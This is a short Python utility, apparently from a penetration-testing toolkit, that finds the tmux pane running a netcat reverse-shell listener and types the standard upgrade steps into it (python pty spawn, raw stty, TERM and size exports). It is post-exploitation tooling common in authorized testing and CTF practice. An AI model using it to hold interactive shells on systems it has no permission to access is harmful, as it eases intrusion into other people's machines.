#!/usr/bin/env python
#--{ alterEGO Linux: "Open the vault of knowledge" }---------------------------
#
# shell_stabilizer.py
#   created        : 2021-05-17 10:37:07 UTC
#   updated        : 2021-05-18 21:06:37 UTC
#   description    : Reverse shell stabilizer.
#------------------------------------------------------------------------------

import os
import subprocess

def pane_finder():

    _found_pane = ''
    panes_pid = subprocess.Popen(['tmux', 'list-panes', '-F', '#{pane_id}:#{pane_pid}'], stdout=subprocess.PIPE)

    panes_list = {}
    for out in panes_pid.stdout:
        _id_pid = out.decode('utf-8').strip().split(':')

        check_ps = subprocess.Popen(['pstree', '-a', _id_pid[1]], stdout=subprocess.PIPE)

        allofthem = [x for x in check_ps.stdout]
        for x in allofthem:
            if b'nc -lnvvp' in x:
                _found_pane = _id_pid[0]

    return _found_pane

def get_info(_pane_id):

    _shell = os.getenv('SHELL')
    _term = os.getenv('TERM')

    subprocess.run(f'tmux send-keys -t {_pane_id} C-z "stty -a" enter "fg" enter', shell=True)
    subprocess.run(f'tmux capture-pane -t {_pane_id} -b sttybuf -S -1', shell=True, stdout=subprocess.PIPE)
    _stty_captured = subprocess.Popen(f'tmux show-buffer -b sttybuf', shell=True, stdout=subprocess.PIPE).communicate()[0]
    _stty_list = _stty_captured.decode('utf-8').split('\n')

    print(_stty_list)

    #### tmux show-buffer is giving us to much info.
    #... The following gives us the index of the last occurence of 
    #... 'speed... rows... columns...'.
    _src = max(idx for idx, val in enumerate(_stty_list) if 'speed' in val)

    _stty_src = _stty_list[_src].split(';')

    for e in _stty_src:
        if e.startswith(' rows'):
            _rows = e.strip()
        elif e.startswith(' columns'):
            _columns = e.strip()

    return (_pane_id, _shell, _term, _rows, _columns)

def main():

    _pane_id, _shell, _term, _rows, _columns = get_info(pane_finder())

    subprocess.run(f"""tmux send-keys -t {_pane_id} "python -c 'import pty; pty.spawn(\\"/bin/bash\\")'" enter""", shell=True)
    subprocess.run(f"""tmux send-keys -t {_pane_id} C-z "stty raw -echo; fg" enter""", shell=True)
    subprocess.run(f"""tmux send-keys -t {_pane_id} "reset" enter""", shell=True)
    subprocess.run(f"""tmux send-keys -t {_pane_id} "export SHELL={_shell}" enter""", shell=True)
    subprocess.run(f"""tmux send-keys -t {_pane_id} "export TERM={_term}" enter""", shell=True)
    subprocess.run(f"""tmux send-keys -t {_pane_id} "stty {_rows} {_columns}" enter""", shell=True)
    subprocess.run(f'tmux select-pane -t {_pane_id}', shell=True)

if __name__ == "__main__":
    main()

#--{ file:FIN }----------------------------------------------------------------
